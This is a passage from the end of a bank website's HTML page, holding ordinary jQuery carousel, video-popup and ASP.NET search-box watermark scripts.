  navText: ["<img src='https://www.jncb.com/JNCB/media/Main-Librarie/Arrows-Left-round.png'>","<img src='https://www.jncb.com/JNCB/media/Main-Librarie/Arrows-right-round.png'>"],
  responsive:{
    0:{
      items:1
    },
    480:{
      items:2
    },
    768:{
      items:3
    },
    992:{
      items:3
    },
    1200:{
      items:4
    }
  }
})

owl = $('.owl-carousel').owlCarousel();

$('.prev').click(function () {
    owl.trigger('prev.owl.carousel');
});
$('.next').click(function () {
    owl.trigger('next.owl.carousel');
});
//]]>
</script>
<script type="text/javascript">
	//<![CDATA[
$(document).ready(function() {
$('.popup-youtube').magnificPopup({
type: 'iframe',
mainClass: 'mfp-fade',
removalDelay: 160,
preloader: false,
fixedContentPos: false
});
});
//]]>
</script>
<script type="text/javascript">
//<![CDATA[
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.TextBoxWatermarkBehavior, {"ClientStateFieldID":"p_lt_ctl02_SmartSearchBox_txtWord_exWatermark_ClientState","WatermarkText":"Loans, Credit Cards, Insurance...","id":"p_lt_ctl02_SmartSearchBox_txtWord_exWatermark"}, null, null, $get("p_lt_ctl02_SmartSearchBox_txtWord"));
});
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.TextBoxWatermarkBehavior, {"ClientStateFieldID":"p_lt_ctl03_pageplaceholder_p_lt_ctl04_SmartSearchBox_txtWord_exWatermark_ClientState","WatermarkText":"Search","id":"p_lt_ctl03_pageplaceholder_p_lt_ctl04_SmartSearchBox_txtWord_exWatermark"}, null, null, $get("p_lt_ctl03_pageplaceholder_p_lt_ctl04_SmartSearchBox_txtWord"));
});
Sys.Application.add_init(function() {
    $create(Sys.Extended.UI.TextBoxWatermarkBehavior, {"ClientStateFieldID":"p_lt_ctl03_pageplaceholder_p_lt_ctl05_SmartSearchBox1_txtWord_exWatermark_ClientState","WatermarkText":"Enter address, city or landmark...","id":"p_lt_ctl03_pageplaceholder_p_lt_ctl05_SmartSearchBox1_txtWord_exWatermark"}, null, null, $get("p_lt_ctl03_pageplaceholder_p_lt_ctl05_SmartSearchBox1_txtWord"));
});
//]]>
</script>
  
  <script type="text/javascript"> 
      //<![CDATA[
      if (window.WebForm_InitCallback) { 
        __theFormPostData = '';
        __theFormPostCollection = new Array();
        window.WebForm_InitCallback(); 
      }
      //]]>
    </script>
  </form>
</body>
</html>
